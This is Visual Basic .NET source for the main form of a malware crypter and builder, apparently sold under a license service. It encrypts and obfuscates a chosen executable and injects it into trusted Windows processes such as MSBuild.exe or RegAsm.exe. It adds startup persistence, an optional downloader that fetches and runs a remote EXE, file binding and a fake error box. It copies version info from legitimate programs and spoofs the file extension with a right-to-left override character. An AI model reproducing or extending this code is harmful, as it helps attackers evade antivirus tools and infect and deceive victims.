Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports System.Reflection.Emit
Imports System.Net
Imports System.Collections.Generic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Data
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Diagnostics
Imports System.Threading
Imports System.Text.RegularExpressions
Imports Microsoft.Win32
Imports System.Runtime.InteropServices

Public Class Form1
    Dim Compiler As New EthernalCompiler
    'Additional Functions
    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function CreateFakeAPI(ByVal number As Integer) As String
        Dim sb As New System.Text.StringBuilder
        For i As Integer = 0 To number - 1
            sb.Append(vbNewLine + "Public Declare  Function " & RA(GetRandom(5, 30)) & " Lib " & Chr(34) & RA(GetRandom(5, 30)) & ".dll"" (ByVal " & RA(GetRandom(5, 30)) & " As String, ByVal " & RA(GetRandom(5, 30)) & " As String(), ByVal " & RA(GetRandom(5, 30)) & " As Char) As Byte()")
        Next
        Return sb.ToString
    End Function
    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
        Dim Generator As System.Random = New System.Random()
        Return Generator.Next(Min, Max)
    End Function
    Public Function RA(ByVal lenght As Integer) As String
        Randomize() : Dim b() As Char : Dim s As New System.Text.StringBuilder("") : b = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm".ToCharArray() : For i As Integer = 1 To lenght : Randomize() : Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1 : s.Append(b(z)) : Next : Return s.ToString
    End Function


    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Dim cat As Byte() = IO.File.ReadAllBytes("banking.dll")
        Dim str As String = Convert.ToBase64String(cat)
        IO.File.WriteAllText("banking.base64", str)
    End Sub
    Public Function bite(ByVal input As String) As Byte()
        Dim bt As Byte() = System.Text.Encoding.Default.GetBytes(input)
        Return bt
    End Function
    Public Function str1(ByVal input As Byte()) As String
        Dim st As String = System.Text.Encoding.Default.GetString(input)
        Return st
    End Function
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        ' Dim str As Byte() = PolyRevCrypt(IO.File.ReadAllBytes(TextBox1.Text), "lol")
        ' IO.File.WriteAllBytes("crypted.txt", str)
        ' IO.File.WriteAllBytes("raw2.exe", PolyRevDeCrypt(str, "lol"))
    End Sub
    Public Shared Function PolyRevDeCrypt(ByVal data As Byte(), ByVal pass As String) As Byte()
        Array.Reverse(data)
        Dim rndByte As Byte = data(data.Length - 1)
        Dim passByte As Byte() = System.Text.Encoding.ASCII.GetBytes(pass)
        Dim Out As Byte() = New Byte(data.Length) {}
        Dim u As Integer = 0
        For i As Integer = 0 To data.Length - 1
            Out(i) = CByte((data(i) Xor rndByte) Xor passByte(u))
            Array.Reverse(passByte)
            If u = passByte.Length - 1 Then
                u = 0
            Else
                u += 1
            End If
        Next
        Array.Resize(Out, Out.Length - 2)
        Return Out
    End Function

    Public Function IsManaged(ByVal exe As Byte()) As Boolean
        Return exe(&H3C) = &H80
    End Function
    Public Sub checkd(ByVal path As String)
        GhostComboBox1.Items.Clear()
        If IsManaged(IO.File.ReadAllBytes(VTextBox1.Text)) = False Then
            VRadiobutton1.Checked = True
            VRadiobutton2.Checked = False
            GhostComboBox1.Items.Add("cvtres.exe")
            GhostComboBox1.Items.Add("vbc.exe")
            GhostComboBox1.Items.Add("csc.exe")
            GhostComboBox1.Items.Add("AppLaunch.exe")
            GhostComboBox1.Items.Add("MSBuild.exe")
            GhostComboBox1.Items.Add("Self Injection")
            GhostComboBox1.Text = "cvtres.exe"
        Else
            VRadiobutton2.Checked = True
            VRadiobutton1.Checked = False
            GhostComboBox1.Items.Add("MSBuild.exe")
            GhostComboBox1.Items.Add("RegAsm.exe")
            GhostComboBox1.Items.Add("RegSvcs.exe")
            GhostComboBox1.Items.Add("Self Injection")
            GhostComboBox1.Text = "MSBuild.exe"
        End If
    End Sub
    Sub New()

        InitializeComponent()
        RichTextBox1.ReadOnly = True
        ' Seal.Protection = RuntimeProtection.None
        ' Seal.RunHook = AddressOf LicenseRun
        ' Seal.BanHook = AddressOf LicenseBan
        ' Seal.RenewHook = AddressOf LicenseRenew
        ' Seal.Initialize("001E0000") 'Required
        PictureBox1.Image = Me.Icon.ToBitmap
        'Seal.RenewHook.Invoke()
        'ProtectProcess()
    End Sub


    Sub LicenseBan()
        MessageBox.Show("Executing BanHook code.")
    End Sub

    Sub LicenseRun()
        ' MessageBox.Show("Executing RunHook code.")
    End Sub

    Sub LicenseRenew()
        LicenseRenewEx()
    End Sub

    Sub LicenseRenewEx()
        Label3.Text = "Username: " & Seal.Username
        ' Label2.Text = "Update Available: " & Seal.UpdateAvailable.ToString()
        Label4.Text = "Expiration Date: " & Seal.ExpirationDate.ToString()
        Label5.Text = "Time Remaining: " & Seal.TimeRemaining.ToString()
        'Label3.Text = "License Points: " & Seal.Points.ToString("N0")
        Label6.Text = "License Type: " & Seal.LicenseType.ToString()
        'Label7.Text = "Unlimited Time: " & Seal.UnlimitedTime.ToString()
        Label7.Text = "Users Online: " & Seal.UsersOnline & " / " & Seal.UsersCount
        'Label8.Text = "GUID: " & Seal.GUID
        Label8.Text = Seal.GlobalMessage
    End Sub
    Private Sub ShowNewsEntries()
        ListView1.Items.Clear()
        For Each P As NewsPost In Seal.News
            Dim I As New ListViewItem(P.Time.ToString("MM.dd.yy"))
            I.SubItems.Add(P.Name)
            I.Tag = P
            ListView1.Items.Add(I)
        Next
    End Sub

    Private Sub ShowPostMessage(ByVal post As NewsPost)
        Dim Message As String = Seal.GetPostMessage(post.ID)

        If String.IsNullOrEmpty(Message) Then
            ShowNewsEntries()
        Else
            news.VTextBox1.Text = post.Name
            news.VTextBox2.Text = Message
        End If
    End Sub


    Private Sub ListView1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        If ListView1.SelectedIndices.Count = 0 Then Return
        ShowPostMessage(DirectCast(ListView1.SelectedItems(0).Tag, NewsPost))
        news.Show()
    End Sub

    Private Sub ListView1_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs)
        If ListView1.GetItemAt(e.X, e.Y) Is Nothing Then
            ListView1.Cursor = Cursors.Default
        Else
            ListView1.Cursor = Cursors.Hand
        End If
    End Sub

    Private Sub ListView1_DrawSubItem(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DrawListViewSubItemEventArgs)
        Dim SB As New SolidBrush(e.SubItem.ForeColor)

        e.DrawBackground()
        e.Graphics.DrawString(e.SubItem.Text, e.SubItem.Font, SB, e.Bounds, Nothing)

        SB.Dispose()
    End Sub

    Private Sub VTextBox1_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles VTextBox1.DragDrop
        Dim File As String() = CType(e.Data.GetData(DataFormats.FileDrop), String())
        Dim F As String = File(0)
        Dim fType As String = F.Substring(F.LastIndexOf(".") + 1)
        If fType.Contains("exe") Then
            VTextBox1.Text = F
        Else
            MessageBox.Show("The file you're trying to add must be EXE.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        checkd(VTextBox1.Text)
    End Sub

    Private Sub VTextBox1_DragEnter(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles VTextBox1.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub
    Private Sub VTextBox17_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles VTextBox17.DragDrop
        Dim File As String() = CType(e.Data.GetData(DataFormats.FileDrop), String())
        Dim F As String = File(0)
        Dim fType As String = F.Substring(F.LastIndexOf(".") + 1)
        If fType.Contains("exe") Then
            VTextBox17.Text = F
        Else
            VTextBox17.Text = F
        End If

    End Sub

    Private Sub VTextBox17_DragEnter(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles VTextBox17.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub
    Private Sub VButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VButton2.Click
        Dim o As New OpenFileDialog With {.Filter = "Executable Files (.exe)|*.exe", .ShowHelp = True}
        If o.ShowDialog = vbOK Then
            VTextBox1.Text = o.FileName
        End If
        checkd(VTextBox1.Text)

    End Sub

    Private Sub VButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VButton3.Click
        Dim o As New OpenFileDialog With {.Filter = "Icon Files (.ico)|*.ico", .ShowHelp = True}
        If o.ShowDialog = vbOK Then
            VTextBox2.Text = o.FileName
        End If
        PictureBox3.ImageLocation = VTextBox2.Text
    End Sub
    Private Sub VTextBox2_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles VTextBox2.DragDrop
        Dim File As String() = CType(e.Data.GetData(DataFormats.FileDrop), String())
        Dim F As String = File(0)
        Dim fType As String = F.Substring(F.LastIndexOf(".") + 1)
        If fType.Contains("ico") Then
            VTextBox2.Text = F
        Else
            MessageBox.Show("The file you're trying to add must be ICO.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        PictureBox3.ImageLocation = VTextBox2.Text
    End Sub

    Private Sub VTextBox2_DragEnter(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles VTextBox2.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub

    Private Sub VCheckBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VCheckBox1.Click
        If VCheckBox1.Checked = True Then
            Label17.Enabled = True
            VTextBox10.Enabled = True
            Label18.Enabled = True
            VTextBox11.Enabled = True
            Label20.Enabled = True
            VTextBox12.Enabled = True
            VRadiobutton3.Enabled = True
            VRadiobutton4.Enabled = True
        Else
            Label17.Enabled = False
            VTextBox10.Enabled = False
            Label18.Enabled = False
            VTextBox11.Enabled = False
            Label20.Enabled = False
            VTextBox12.Enabled = False
            VRadiobutton3.Enabled = False
            VRadiobutton4.Enabled = False
        End If
    End Sub
    Dim sb As New System.Text.StringBuilder()
    Private Sub RandomPool1_CharacterSelection(ByVal s As System.Object, ByVal c As System.Char)
        sb.Append(c)
        If sb.Length < 50 Then VTextBox13.Text = sb.ToString
        VButton1.Enabled = True
    End Sub

    Private Sub VCheckBox5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VCheckBox5.Click
        If VCheckBox5.Checked = True Then
            VTextBox16.Enabled = True
        Else
            VTextBox16.Enabled = False
        End If
    End Sub

    Private Sub VCheckBox6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VCheckBox6.Click
        If VCheckBox6.Checked = True Then
            VTextBox17.Enabled = True
            VButton5.Enabled = True
        Else
            VTextBox17.Enabled = False
            VButton5.Enabled = False
        End If
    End Sub

    Private Sub VCheckBox7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VCheckBox7.Click
        If VCheckBox7.Checked = True Then
            VTextBox18.Enabled = True
            VTextBox19.Enabled = True
        Else
            VTextBox18.Enabled = False
            VTextBox19.Enabled = False
        End If
    End Sub

    Private Sub VCheckBox3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VCheckBox3.Click
        If VCheckBox3.Checked = True Then
            VTextBox14.Enabled = True
        Else
            VTextBox14.Enabled = False

        End If
    End Sub

    Private Sub VCheckBox4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VCheckBox4.Click
        If VCheckBox4.Checked = True Then
            VTextBox15.Enabled = True
        Else
            VTextBox15.Enabled = False

        End If
    End Sub
    Public Shared Function PolyRevCrypt(ByVal data As Byte(), ByVal pass As String) As Byte()
        Dim rndByte As Byte = CByte(New Random().[Next](1, 255))
        Dim passByte As Byte() = System.Text.Encoding.ASCII.GetBytes(pass)
        Dim Out As Byte() = New Byte(data.Length) {}
        Dim u As Integer = 0
        For i As Integer = 0 To data.Length - 1
            Out(i) = CByte((data(i) Xor passByte(u)) Xor rndByte)
            Array.Reverse(passByte)
            If u = passByte.Length - 1 Then
                u = 0
            Else
                u += 1
            End If
        Next
        Array.Resize(Out, Out.Length)
        Out(Out.Length - 1) = rndByte
        Array.Reverse(Out)
        Return Out
    End Function
    Public Function GeneratePassword()
        Dim s As String = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ∀ℬℭÐℰℱḠ♓ℐⒿḰℒℳℵ☮Ṕℚℛϟ✝ÜṼ₩✕¥☡AБCDЁFGHЇJКLMЙОPФЯ$TЦVШЖУZ"
        Dim r As New Random
        Dim sb As New StringBuilder
        For i As Integer = 1 To GetRandom(10, 45)
            Dim idx As Integer = r.Next(1, 80)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Public Function ROT13Encode(ByVal InputText As String) As String
        Dim str As String = ""
        Dim num3 As Integer = (InputText.Length - 1)
        Dim i As Integer = 0
        Do While (i <= num3)
            Dim charCode As Integer = Strings.Asc(Convert.ToChar(InputText.Substring(i, 1)))
            If ((charCode >= &H61) And (charCode <= &H6D)) Then
                charCode = (charCode + 13)
            ElseIf ((charCode >= 110) And (charCode <= &H7A)) Then
                charCode = (charCode - 13)
            ElseIf ((charCode >= &H41) And (charCode <= &H4D)) Then
                charCode = (charCode + 13)
            ElseIf ((charCode >= &H4E) And (charCode <= 90)) Then
                charCode = (charCode - 13)
            End If
            str = (str & Conversions.ToString(Strings.ChrW(charCode)))
            i += 1
        Loop
        Return str
    End Function
    Public Function Rot13(ByVal source$)
        Dim matchs As MatchCollection = Regex.Matches(source, "Dim .* As ")
        Dim num3 As Integer = (matchs.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num3)
            Dim expression As String = matchs.Item(i).Value
            Dim list As New ArrayList
            expression = expression.Replace("Dim ", "").Replace(" As ", "")
            list.AddRange(Strings.Split(expression, ",", -1, CompareMethod.Binary))
            Dim num4 As Integer = (list.Count - 1)
            Dim j As Integer = 0
            Do While (j <= num4)
                source = Regex.Replace(source, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("( |\n|\(|,)", list.Item(j)), "( |\.|\(|\)|\n|\r|,)")), ("$1" & Me.ROT13Encode(Conversions.ToString(list.Item(j))) & Me.RndString & "$2"))
                j += 1
            Loop
            i += 1
        Loop
        Return source
    End Function
    Public Function RndString() As String
        Dim objRandom As Random = New Random(CInt((DateTime.Now.Ticks Mod &H7FFFFFFF)))
        Dim str As String = Conversions.ToString(If((objRandom.Next(1, 3) = 1), Strings.Chr(objRandom.Next(&H41, &H5B)), Strings.Chr(objRandom.Next(&H61, &H7B))))
        Dim num2 As Integer = objRandom.Next(5, 50)
        Dim i As Integer = 1
        Do While (i <= num2)
            Dim ch As Char
            Select Case objRandom.Next(1, 4)
                Case 1
                    ch = Strings.Chr(objRandom.Next(&H41, &H5B))
                    Exit Select
                Case 2
                    ch = Strings.Chr(objRandom.Next(&H61, &H7B))
                    Exit Select
                Case 3
                    ch = Strings.Chr(objRandom.Next(&H30, &H3A))
                    Exit Select
            End Select
            str = (str & Conversions.ToString(ch))
            i += 1
        Loop
        Return str
    End Function
    Private Sub ReverseRandom(ByVal source$)
        Dim matchs As MatchCollection = Regex.Matches(source, "Dim .* As ")
        Dim num3 As Integer = (matchs.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num3)
            Dim expression As String = matchs.Item(i).Value
            Dim list As New ArrayList
            expression = expression.Replace("Dim ", "").Replace(" As ", "")
            list.AddRange(Strings.Split(expression, ",", -1, CompareMethod.Binary))
            Dim num4 As Integer = (list.Count - 1)
            Dim j As Integer = 0
            Do While (j <= num4)
                source = Regex.Replace(source, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("( |\n|\(|,)", list.Item(j)), "( |\.|\(|\)|\n|\r|,)")), ("$1" & Me.RndString & Strings.StrReverse(Conversions.ToString(list.Item(j))) & "$2"))
                j += 1
            Loop
            i += 1
        Loop
    End Sub
    Private Sub VButton1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VButton1.Click
        ' ListBox1.Items.Clear()
        ' ListBox1.Items.Add("Locating Resources..")
        Dim pass$ = GeneratePassword()
        VTextBox13.Text = pass
        Dim source As String = IO.File.ReadAllText("C:\Users\Richie\Desktop\stub\stub\banking.vb")
        Dim input As Byte() = PolyRevCrypt(IO.File.ReadAllBytes(VTextBox1.Text), pass)
        IO.File.WriteAllBytes("format.txt", input)
        IO.File.WriteAllBytes("banking.dll", PolyRevCrypt(My.Resources.banking, pass))
        'ListBox1.Items.Add("Writting Data..")
        source = source.Replace("%3%", VTextBox3.Text)
        source = source.Replace("%4%", VTextBox4.Text)
        source = source.Replace("%5%", VTextBox5.Text)
        source = source.Replace("%6%", VTextBox6.Text)
        source = source.Replace("%7%", VTextBox7.Text)
        source = source.Replace("%8%", VTextBox8.Text)
        source = source.Replace("%9%", VTextBox9.Text)
        source = source.Replace("%pass%", pass)
        If GhostComboBox1.Text = "Self Injection" Then
            source = source.Replace("LF(""%injection%"")", "System.Reflection.Assembly.GetExecutingAssembly.Location()")
        Else
            source = source.Replace("%injection%", GhostComboBox1.Text)
        End If
        If VRadiobutton3.Checked = True Then
            source = source.Replace("%AppTemp%", "APPDATA")
        ElseIf VRadiobutton4.Checked = True Then
            source = source.Replace("%AppTemp%", "TEMP")
        End If
        If VCheckBox1.Checked = True Then
            source = source.Replace("%install%", "tgcape.crabhut(Application.ExecutablePath)")
            source = source.Replace("%KeyName%", VTextBox10.Text)
            source = source.Replace("%FileName%", VTextBox11.Text)
            source = source.Replace("%SubName%", VTextBox12.Text)
        Else
            source = source.Replace("%install%", "")
        End If
        If VCheckBox3.Checked = True Then
            source = source.Replace("%Delay%", "System.Threading.Thread.Sleep(" + VTextBox14.Text + "000)")

        Else
            source = source.Replace("%Delay%", "")
        End If
        If VCheckBox5.Checked = True Then
            source = source.Replace("%Downloader%", "Dim wc As New WebClient : Dim pths As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) : IO.File.WriteAllBytes(pths + ""/akons.exe"", wc.DownloadData(""" + VTextBox16.Text + """)) : Process.Start(pths + ""/akons.exe"")")

        Else
            source = source.Replace("%Downloader%", "")
        End If
        If VCheckBox6.Checked = True Then
            source = source.Replace("%Binder%", Path.GetFileName(VTextBox17.Text))
            source = source.Replace("%Binder2%", Path.GetFileNameWithoutExtension(VTextBox17.Text))
            Compiler.AddResource(Path.GetFileNameWithoutExtension(VTextBox17.Text), VTextBox17.Text)
        Else
            source = source.Replace("%Binder%", "")
            source = source.Replace("%Binder2%", "")
        End If
        If VCheckBox7.Checked = True Then
            source = source.Replace("%errormsg%", "MsgBox(""" + VTextBox19.Text + """, MsgBoxStyle.Critical, """ + VTextBox18.Text + """)")

        Else
            source = source.Replace("%errormsg%", "")
        End If
        source = Rot13(source)
        ReverseRandom(source)
        Compiler.Source = source
        Compiler.File_Align = File_Align._512
        Compiler.DotNetVersion = DotNetVersion.v2
        Compiler.Platform = Platform.x86
        Compiler.ErrorLog = False
        Compiler.References = New [String]() {"system.windows.forms.dll", "system.drawing.dll", "Microsoft.VisualBasic.dll", "mscorlib.dll"}
        Compiler.AddResource("banking", "banking.dll")
        Compiler.AddResource("text", "format.txt")
        Compiler.Target = Target.WinForms
        Compiler.SilentMode = False
        Compiler.Optimize = True
        Compiler.Icon = getico()
        'ListBox1.Items.Add("Compiling Executable..")
        Compiler.Compile("btc.exe")
        IO.File.Delete("banking.dll")
        IO.File.Delete("format.txt")
        IO.File.Delete("icon.ico")
        If VCheckBox4.Checked = True Then
            'ListBox1.Items.Add("Spoofing Exstension..")
            Try
                Dim Ext$ = "bitcoins.scr" 'File Location. (Declare this with a OpenFileDialog for example)
                Dim cX As Char = ChrW(8238)
                Dim FileName$ = Path.GetFileName(Ext)
                Dim Int# = FileName.Length - 4 'Detecting the Extension. (Executing windows exploit)
                Dim cY As Char() = VTextBox15.Text.ToCharArray()
                Array.Reverse(cY)
                Dim Dir$ = FileName.Substring(0, Int) & cX & New String(cY) & FileName.Substring(Int)
                File.Move(FileName, Dir)
            Catch
            End Try
        End If
        'ListBox1.Items.Add("Mission Complete!")
    End Sub

    Public Function getico()
        If VTextBox2.Text = "              Drag 'n Drop" Then
            Dim ms As New MemoryStream()
            Dim Icon As Icon = My.Resources.icon
            Icon.Save(ms)
            IO.File.WriteAllBytes("icon.ico", ms.GetBuffer())
            Return "icon.ico"
        Else
            Return VTextBox2.Text
        End If
    End Function
    Private Sub VButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VButton4.Click
        Dim s() As String = GetAllStartupFile()
        Dim a As String
        Dim randomNumber As New Random
restart:
        a = s(randomNumber.Next(0, s.Length))
        If a = Nothing Then
        Else
            Try
                GetFileInfo(a)
            Catch
                GoTo restart
            End Try
        End If
    End Sub
    Private Function GetFileInfo(ByVal filename As String) As Version
        Dim Info As FileVersionInfo
        Info = FileVersionInfo.GetVersionInfo(filename)
        VTextBox3.Text = Path.GetFileNameWithoutExtension(filename)
        VTextBox4.Text = Info.CompanyName
        VTextBox5.Text = Info.ProductName
        VTextBox6.Text = Info.LegalCopyright
        VTextBox7.Text = Info.LegalTrademarks
        VTextBox8.Text = Info.FileVersion
        VTextBox9.Text = Info.ProductVersion
        If VTextBox8.Text.Contains(",") Then
            VTextBox8.Text = GetRandom(1, 19) & "." & GetRandom(0, 20) & "." & GetRandom(0, 50) & "." & GetRandom(0, 99)
            VTextBox9.Text = GetRandom(1, 19) & "." & GetRandom(0, 25) & "." & GetRandom(0, 65) & "." & GetRandom(0, 90)
        End If
    End Function

    Public Function GetAllStartupFile() As String()
        Dim result() As String = Nothing
        Dim regKey As RegistryKey = Nothing
        Dim arrCounter As Integer = 0
        Try
            'FOR CURRENT USER
            regKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", False)
            'result = regKey.GetValueNames()
            For Each itm As String In regKey.GetValueNames
                itm.Replace(Chr(34), "")
                ReDim Preserve result(arrCounter)
                result(arrCounter) = CType(regKey.GetValue(itm), String)
                arrCounter += 1
            Next
            regKey.Close()
            'FOR LOCAL MACHINE/ALL USER
            regKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", False)
            'result = regKey.GetValueNames()
            For Each itm As String In regKey.GetValueNames
                itm.Replace(Chr(34), "")
                ReDim Preserve result(arrCounter)
                result(arrCounter) = CType(regKey.GetValue(itm), String)
                arrCounter += 1
            Next
            regKey.Close()
            Return result
        Catch ex As Exception
        Finally
            If Not regKey Is Nothing Then
                regKey.Close()
            End If

        End Try
        Return result
    End Function

    Private Sub VButton6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VButton6.Click
        Dim o As New OpenFileDialog With {.Filter = "Executable Files (.exe)|*.exe", .ShowHelp = True}
        If o.ShowDialog = vbOK Then
            GetFileInfo(o.FileName)
        End If
    End Sub

    Private Sub VRadiobutton3_MouseLeave(ByVal sender As Object, ByVal e As System.EventArgs) Handles VRadiobutton3.MouseLeave
        If VRadiobutton3.Checked = True Then
            VRadiobutton4.Checked = False
        End If
    End Sub


    Private Sub VRadiobutton4_MouseLeave(ByVal sender As Object, ByVal e As System.EventArgs) Handles VRadiobutton4.MouseLeave
        If VRadiobutton4.Checked = True Then
            VRadiobutton3.Checked = False
        End If
    End Sub

End Class
